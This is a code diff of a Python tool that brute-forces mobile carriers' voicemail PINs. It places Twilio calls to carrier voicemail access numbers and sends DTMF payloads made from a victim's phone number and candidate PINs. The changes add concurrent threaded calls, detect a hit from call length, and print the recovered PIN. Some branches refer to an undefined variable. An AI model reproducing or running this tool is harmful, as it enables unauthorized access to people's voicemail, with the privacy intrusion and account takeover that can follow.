@@ -1,6 +1,9 @@
 import argparse
 import itertools
+import os
+import signal
 import sys
+import threading
 import time
 # Download the Python helper library from twilio.com/docs/python/install
 from twilio.rest import Client
@@ -268,9 +271,9 @@ def retrieve_payload_message(args):
     if args.carrier == 'att':
         payload = '#ww' + args.usernumber + 'www' + args.pin
     elif args.carrier == 'ting':
-        payload = "#"
+        payload = "*" + args.usernumber + "#" + args.pin
     elif args.carrier == "tmobile":
-        payload = "#"
+        payload = "*" + args.usernumber + "#" + args.pin
     elif args.carrier == 'verizon':
         payload = '#' + args.usernumber + "#" + args.pin + "#*ww1"
     return payload
@@ -281,46 +284,22 @@ def retrieve_payload_message(args):
 #        sys.exit()
 
 
-def retrieve_payload_bruteforce(args, pins):
+def retrieve_payload_bruteforce(args, the_pin):
     payload = False
-    if type(pins) == list:
-        if len(pins) != 1:
-            if args.carrier == 'att':
-                the_pins = "#".join(pins)
-                payload = f"#ww{args.usernumber}www{the_pins}"
-            elif args.carrier == 'ting':
-                the_pins = "#".join(pins)
-                print(the_pins)
-                payload = f"#ww{args.usernumber}www{the_pins}"
-                print(payload)
-            elif args.carrier == "tmobile":
-                the_pins = "#".join(pins)
-                payload = f"#ww{args.usernumber}www{the_pins}"
-            elif args.carrier == 'verizon':
-                the_pins = "#".join(pins)
-                payload = f"#www{args.usernumber}www{the_pins}"
-        else:
-            if args.carrier == 'att':
-                payload = '#ww' + args.usernumber + 'www' + pins
-            elif args.carrier == 'ting':
-                payload = '#ww' + args.usernumber + 'www' + pins
-                print(f'payloaded: {payload}')
-            elif args.carrier == "tmobile":
-                payload = '#ww' + args.usernumber + 'www' + pins
-                print(f'payloaded: {payload}')
-            elif args.carrier == 'verizon':
-                payload = '#www' + args.usernumber + 'www' + pins
-    else:
-        if args.carrier == 'att':
-            payload = '#ww' + args.usernumber + 'www' + pins
-        elif args.carrier == 'ting':
-            payload = '#ww' + args.usernumber + 'www' + pins
-        elif args.carrier == "tmobile":
-            payload = '#ww' + args.usernumber + 'www' + pins
-        elif args.carrier == 'verizon':
-            payload = '#www' + args.usernumber + 'www' + pins
+    if args.carrier == 'att':
+        payload = '#ww' + args.usernumber + 'www' + pins
+    elif args.carrier == 'ting':
+        repeat_this = 'www*www1'
+        print(f'PIN being tried: {the_pin}')
+        payload = f"wwwwwwww*wwwwwwww{args.usernumber}wwwwwwww{the_pin}#"
+    elif args.carrier == "tmobile":
+        repeat_this = 'www*www1'
+        print(f'PIN being tried: {the_pin}')
+        payload = f"wwwwwwww*wwwwwwww{args.usernumber}wwwwwwww{the_pin}#"
+    elif args.carrier == 'verizon':
+        payload = '#www' + args.usernumber + 'www' + pins
     if payload:
-        return payload
+        return payload, the_pin
     else:
         print('Your payload is not implemented yet.')
         sys.exit()
@@ -353,17 +332,17 @@ def retrieve_newest_message(args):
         if call_status == 'queued':
             if not call_queued:
                 call_queued = True
-                print('The call is currently: QUEUED')
+#                print('The call is currently: QUEUED')
         elif call_status == 'ringing':
             if not call_ringing:
                 call_ringing = True
-                print('The call is currently: RINGING')
+#                print('The call is currently: RINGING')
         elif call_status == 'in-progress':
             if call_queued:
                 call_queued = False
             if not call_in_progress:
                 call_in_progress = True
-                print('The call is currently: IN PROGRESS')
+#                print('The call is currently: IN PROGRESS')
     if call_status == 'completed':
         call_duration = call_info.duration
         recording = client.recordings \
@@ -375,7 +354,7 @@ def retrieve_newest_message(args):
         print(call_record_url)
 
 
-def rock_and_roll(args, payload, backdoor):
+def rock_and_roll(args, payload, backdoor, the_pin):
     call = client.calls.create(
             to=backdoor,
             from_=args.callerid,
@@ -411,17 +390,21 @@ def rock_and_roll(args, payload, backdoor):
     print(f'Backdoor Number: {backdoor}')
     print(f'Call duration: {call_info.duration}')
     if call_status == 'completed':
+        call_info = client.calls(call.sid).fetch()
         call_duration = int(call_info.duration)
         recording = client.recordings \
             .list(call_sid=call.sid, limit=1)
         recording_sid = [x.sid for x in recording][0]
         call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
-        if call_duration >= 20:
-            return True, True
-        elif call_duration >= 15:
-            return False, True
-        else:
-            return False, False
+        if args.carrier in ['ting', 'tmobile']:
+            if call_duration >= 70:
+                print(f'The PIN for {args.usernumber} is {the_pin}')
+                os.kill(os.getpid(), signal.SIGINT)
+                os.kill(os.getpid(), signal.SIGINT)
+
+
+def chunk(lst, n):
+    return zip(*[iter(lst)]*n)
 
 
 def individual_pins(args):
@@ -543,26 +526,33 @@ def which_pins(args):
 def bruteforce(args):
     found = False
     pins_to_use = which_pins(args)
+    temp_pin_list = []
     if not args.backdoornumber:
         backdoor = find_backdoor(args)
     else:
         backdoor = args.backdoornumber
-    start = 0
-    end = 3
     while not found:
-        pins = pins_to_use[start:end]
-        if pins != []:
-            payload = retrieve_payload_bruteforce(args, pins)
-            found, possible = rock_and_roll(args, payload, backdoor)
-            if possible:
-                for pin in pins:
-                    payload = retrieve_payload_bruteforce(args, pin)
-                    found, possible = rock_and_roll(args, payload, backdoor)
-                    if found:
-                        print(f'The PIN for {args.usernumber} is {pin}')
-            else:
-                start += 3
-                end += 3
+        if pins_to_use != []:
+            for pin in pins_to_use:
+                if args.call_volume:
+                    for the_pins in chunk(pins_to_use, args.call_volume):
+                        temp_pin_list.append(the_pins)
+                    pins_to_use = temp_pin_list
+                    try:
+                        if pins_to_use[0]:
+                            calls = []
+                            for each in pins_to_use[0]:
+                                payload, the_pin = retrieve_payload_bruteforce(args, each)
+                                the_call = threading.Thread(target=rock_and_roll, args=(args, payload, backdoor, the_pin))
+                                calls.append(the_call)
+                                the_call.start()
+                            for call in calls:
+                                call.join()
+                            calls = []
+                            pins_to_use.pop(pins_to_use.index(pins_to_use[0]))
+                    except IndexError:
+                        print("You've exhausted all of your PINs")
+                        sys.exit()
         else:
             print("You've exhausted your selected PINs.")
             sys.exit(0)
@@ -580,6 +570,8 @@ if __name__ == '__main__':
     bruteforce_parser.add_argument("--callerid", dest="callerid", required=True, help="Phone number the call is originating from")
     bruteforce_parser.add_argument("--backdoornumber", dest="backdoornumber", metavar="0008675309",
                                    help="Voicemail backdoor number, if you know it")
+    bruteforce_parser.add_argument('--async', metavar='555', required=True, dest="call_volume", type=int,
+                                    help='How many calls to have at once')
     bruteforce_parser.add_argument("--toppins", dest="top_4_pins", action="store_true",
                                    help="Try the Top 20 4-digit PINs")
     bruteforce_parser.add_argument("--topfivedigitpins", dest="top_5_pins", action="store_true",
